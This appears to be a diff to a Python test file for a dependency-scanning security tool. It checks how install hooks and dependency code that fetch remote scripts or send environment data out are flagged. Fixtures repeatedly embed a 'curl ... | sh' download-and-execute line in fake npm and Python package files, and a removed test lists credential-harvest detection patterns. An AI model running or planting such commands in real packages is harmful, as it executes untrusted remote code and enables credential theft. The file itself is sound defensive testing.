@@ -129,7 +129,7 @@ class DependencyCheckTests(unittest.TestCase):
         for i in self.res["issues"]:
             if i["rule"] == "SC-INSTALL-HOOK":
                 hooks.setdefault(i["file"].replace(os.sep, "/"), []).append((i["sev"], i["msg"]))
-        env = "reads environment variables or credential files and sends data over the network"
+        env = "sends environment variables over the network (the whole environment)"
         want_critical = {
             "node_modules/a/package.json": f"Install hook runs install.dat, which {env}.",
             "node_modules/b/package.json": f"Install hook runs ./install.sh, which {env}.",
@@ -137,7 +137,7 @@ class DependencyCheckTests(unittest.TestCase):
             "node_modules/d/package.json": f"Install hook runs ./bin/setup, which {env}.",
             "node_modules/f/package.json": f"Install hook runs ../../scripts/first-party.js, which {env}.",
             "node_modules/q/package.json": "Install hook runs ./pre.js, which pipes a download into a shell.",
-            "node_modules/r/package.json": '"postinstall" script runs a network-fetch/eval command at install time.',
+            "node_modules/r/package.json": '"postinstall" script pipes a download into a shell.',
             "node_modules/t/package.json": "Install hook runs script, which pipes a download into a shell.",
         }
         for manifest, msg in want_critical.items():
@@ -183,8 +183,8 @@ class DependencyCheckTests(unittest.TestCase):
         self.assertEqual(sorted(risk), ["node_modules/i/index.js", "node_modules/i/lib/util.py", "node_modules/v/index.js"])
         self.assertEqual((risk["node_modules/i/index.js"]["sev"], risk["node_modules/i/index.js"]["line"],
                           risk["node_modules/i/index.js"]["msg"]),
-                         ("MAJOR", 3, "Dependency code reads credentials or the whole environment and sends "
-                                      "data over the network."))
+                         ("CRITICAL", 3, "Dependency code reads credentials or the whole environment and sends "
+                                         "data over the network."))           # 2.17: sent anywhere
         self.assertEqual(risk["node_modules/i/lib/util.py"]["line"], 2)
         snippet = "\n".join(risk["node_modules/v/index.js"]["snippet"])
         self.assertEqual(len(risk["node_modules/v/index.js"]["snippet"]), 4)
@@ -212,6 +212,58 @@ class DependencyCheckTests(unittest.TestCase):
         self.assertFalse(res["pass"])
 
 
+#: (the detection round) a web app's static assets run in a browser: left out
+#: unless an entry point reaches them. The npm twin's test has the same tree
+#: (js/test/review-dependency-checks.test.js).
+WEB = "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n"
+WEB_TREE = {
+    "package.json": json.dumps({"name": "app", "version": "1.0.0"}),
+    # main requires a file in public/: read; the others in static/ and _next/: not
+    "node_modules/w/package.json": json.dumps({"name": "w", "version": "1.0.0", "main": "lib/index.js"}),
+    "node_modules/w/lib/index.js": "module.exports = require('../public/widget');\n",
+    "node_modules/w/public/widget.js": WEB,
+    "node_modules/w/public/other.js": WEB,
+    "node_modules/w/static/chunk.js": WEB,
+    "node_modules/w/_next/static/x.js": WEB,
+    # a main, a bin and an export that point into static/: read
+    "node_modules/x/package.json": json.dumps({"name": "x", "version": "1.0.0", "main": "static/index.js",
+                                               "bin": {"x": "./static/cli.js"},
+                                               "exports": {".": "./static/index.js", "./y": {"require": "./static/y.js"}}}),
+    "node_modules/x/static/index.js": WEB,
+    "node_modules/x/static/cli.js": WEB,
+    "node_modules/x/static/y.js": WEB,
+    "node_modules/x/static/z.js": WEB,
+    # a script in public/ the main starts with node: read
+    "node_modules/s/package.json": json.dumps({"name": "s", "version": "1.0.0"}),
+    "node_modules/s/index.js": "const { spawn } = require('child_process');\nconst path = require('path');\n"
+                               "spawn(process.execPath, [path.join(__dirname, 'public', 'run.js')], { detached: true });\n",
+    "node_modules/s/public/run.js": WEB,
+    # a Python package's browser bundle (litellm's proxy UI): not read; its Python is
+    "lib/python3.12/site-packages/ui/proxy/_experimental/out/_next/static/chunks/c.js": WEB,
+    "lib/python3.12/site-packages/ui/__init__.py": "import os\nos.system('curl -s https://files.invalid/x | sh')\n",
+}
+
+
+class WebAssetTests(unittest.TestCase):
+    def test_static_assets_no_entry_point_reaches(self):
+        root = make_tree(WEB_TREE)
+        try:
+            res = core.scan_project(root, include_deps=True)
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+        self.assertEqual(sorted(by_file(res, "SC-IMPORT-RISK")),
+                         ["lib/python3.12/site-packages/ui/__init__.py", "node_modules/s/public/run.js",
+                          "node_modules/w/public/widget.js", "node_modules/x/static/cli.js",
+                          "node_modules/x/static/index.js", "node_modules/x/static/y.js"])
+
+    def test_entries(self):
+        self.assertEqual(core._deps_npm_entries({"main": "a.js", "module": "b.mjs", "bin": {"c": "c.js", "d": 1},
+                                                 "exports": {".": {"import": "./e.mjs", "require": ["./f.js", "./g.js"]},
+                                                             "./*": "./h/*.js"}}),
+                         ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"])
+        self.assertEqual(core._deps_npm_entries({"bin": "x.js", "exports": "./y.js"}), ["x.js", "./y.js"])
+
+
 class HelperTests(unittest.TestCase):
     def test_tree_join(self):
         cases = {("node_modules/a", "x.js"): "node_modules/a/x.js", ("node_modules/a", "./b/../x.js"): "node_modules/a/x.js",
@@ -222,16 +274,6 @@ class HelperTests(unittest.TestCase):
         for (base, target), want in cases.items():
             with self.subTest(base=base, target=target):
                 self.assertEqual(core._tree_join(base, target), want)
-
-    def test_import_risk_needles_hold_every_match(self):
-        """The pre-check never hides a match: every alternative of the
-        pattern needs one of the needles."""
-        for text in ("JSON.stringify( process.env)", "json.dumps(dict(os.environ))", "str(os.environ)",
-                     "urlencode(os.environ,", "/.ssh/id_x", "id_ecdsa", "a.git-credentials",
-                     "local storage/leveldb", "LOCAL STORAGE\\leveldb"):
-            with self.subTest(text=text):
-                self.assertTrue(core._IMPORT_HARVEST_RE.search(text))
-                self.assertTrue(any(n in text for n in core._IMPORT_HARVEST_NEEDLES))
 
 
 if __name__ == "__main__":
